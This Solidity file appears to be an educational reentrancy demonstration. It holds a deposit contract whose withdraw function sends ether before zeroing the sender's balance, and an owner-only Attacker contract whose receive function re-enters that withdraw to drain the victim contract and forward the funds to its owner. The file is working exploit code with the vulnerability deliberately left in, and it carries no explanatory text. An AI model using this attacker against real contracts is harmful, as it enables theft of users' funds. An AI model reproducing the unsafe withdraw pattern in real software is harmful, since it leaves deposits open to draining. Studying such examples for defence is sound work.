// SPDX-License-Identifier: CC-BY-SA-4.0
pragma solidity 0.8.21;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract EthDeposit {
    using Address for address payable;

    // Mapping to track the balance of each address.
    mapping(address => uint256) public balance;

    // Function to allow users to deposit ether into the contract.
    function depositEther() external payable {
        // Increase the balance of the sender (msg.sender) by the sent value.
        balance[msg.sender] += msg.value;
    }

    // Function to allow users to withdraw their ether from the contract.
    function withdrawEther() external {
        // Transfer the balance from this contract to the sender's address.
        payable(msg.sender).sendValue(balance[msg.sender]);
        // Set the sender's balance in the contract to zero after withdrawal.
        balance[msg.sender] = 0;
    }
}

// Define the contract, inheriting from the Ownable contract
contract Attacker is Ownable {
    // Declare a public immutable variable to store the EthDeposit contract
    EthDeposit public immutable ethContract;

    // Constructor function that initializes the contract
    constructor(
        address _ethAddress,
        address initialOwner
    ) Ownable(initialOwner) {
        // Assign the provided Ethereum address to the ethContract variable
        ethContract = EthDeposit(_ethAddress);
    }

    // Function that allows the owner to attack the ethContract
    function attack() external payable onlyOwner {
        // Deposit the received Ether into ethContract
        ethContract.depositEther{value: msg.value}();
        // Withdraw Ether from ethContract
        ethContract.withdrawEther();
    }

    // Receive function that handles incoming Ether
    receive() external payable {
        // Check if ethContract has a balance greater than zero
        if (address(ethContract).balance > 0) {
            // Withdraw Ether from ethContract
            ethContract.withdrawEther();
            // Transfer the balance of this contract to the owner
            payable(owner()).transfer(address(this).balance);
        }
    }
}
